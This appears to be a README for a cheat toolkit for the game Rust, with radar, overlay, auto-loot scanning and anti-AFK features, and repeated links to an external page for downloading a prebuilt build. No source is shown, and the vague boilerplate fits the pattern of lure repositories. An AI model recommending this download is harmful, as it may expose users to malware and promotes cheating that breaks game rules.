# Rust-PE v2026 - Game Script Utility 2026

> Rust-PE is a Rust-focused game automation toolkit built around movement generation, visual overlay support, loot scanning, and persistence helpers for routine gameplay flows.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Rust%20game-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/tomhill29/rust-pe-persistence-script-hub?style=flat-square)](https://github.com/tomhill29/rust-pe-persistence-script-hub)

---

<p align="center">
  <a href="https://tomhill29.github.io/rust-pe-persistence-script-hub/">
    <img src="https://img.shields.io/badge/Download-Rust-PE%20Script-brightgreen?style=for-the-badge" alt="Download Rust-PE Script">
  </a>
</p>

> **[Direct Download - Rust-PE](https://tomhill29.github.io/rust-pe-persistence-script-hub/)**

---

[Download Latest Build](https://tomhill29.github.io/rust-pe-persistence-script-hub/)

---

## Project Summary

Rust-PE is organized as an automation and helper package for Rust gameplay, with a strong focus on procedural route generation, loot scanning, and configurable runtime behavior. It targets the Rust game environment and structures its logic through a state-machine model with profile-driven settings.

Alongside the core logic, the suite provides visual support tools such as an overlay and radar-style view, plus anti-AFK persistence and path smoothing with jitter injection. In practice, updates are expected to refine route handling, improve scan behavior, and keep configuration profiles straightforward to adapt across setups.

## Features

- Procedural movement generation for scripted route behavior
- Treasure scanning with auto-loot-oriented handling
- Visual overlay and radar-style presentation
- Anti-AFK persistence support for longer sessions
- Profile-based configuration for different usage patterns
- Path smoothing to shape movement flow
- Jitter injection for more varied route behavior
- State machine structure for organized automation logic
- Internal-style integration approach for game-side routines

## Setup

1. Download the latest build from the release link above.
2. Extract the files into a dedicated folder such as `rust-treasure-tracker`.
3. Place any required configuration profiles alongside the script files.
4. Load or launch the script according to your preferred runtime method.

Example layout:

`rust-treasure-tracker/`
- `Rust-PE`
- `profiles/`
- `config`
- `logs/`

## Configuration

Most behavior is controlled through profiles and script-side toggles. A basic setup can be represented like this:

| Option | Purpose |
| --- | --- |
| `profile_name` | Selects the active configuration set |
| `movement_mode` | Chooses how procedural paths are generated |
| `overlay_enabled` | Turns visual overlay output on or off |
| `radar_enabled` | Controls radar-style visualization |
| `loot_scanning` | Enables treasure and loot scanning behavior |
| `anti_afk` | Keeps persistence routines active |
| `jitter_level` | Adjusts how much variation is added to paths |

## Compatibility Notes

Rust-PE is intended for the Rust game environment and the internal-style workflow referenced in the project metadata. Actual compatibility can vary depending on the game build, the runtime used to load the script, and the active profile configuration.

Known limitations to keep in mind:
- Behavior can vary with game updates
- Movement and scan logic may need profile tuning
- Visual features depend on the active display setup
- Some options may not apply to every runtime or build

## FAQ

### How do I install it?
Download the latest build, unpack it into its own folder, and keep the script files together with any profile or configuration data it expects.

### How do I update it?
Swap the older files for the newer build from the download link, then check your configuration profiles for any new or revised options.

### Can I customize behavior?
Yes. The project uses profile-based configuration, so movement, overlays, scanning, and persistence settings can be adjusted for each setup.

### What if the script does not match my game version?
Review the compatibility notes and any runtime-specific requirements. A newer Rust build may call for updated settings or refreshed logic.

### Where should I store profiles and settings?
Keep them inside the project directory or in the folder structure recommended by your runtime so the script can load them consistently.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
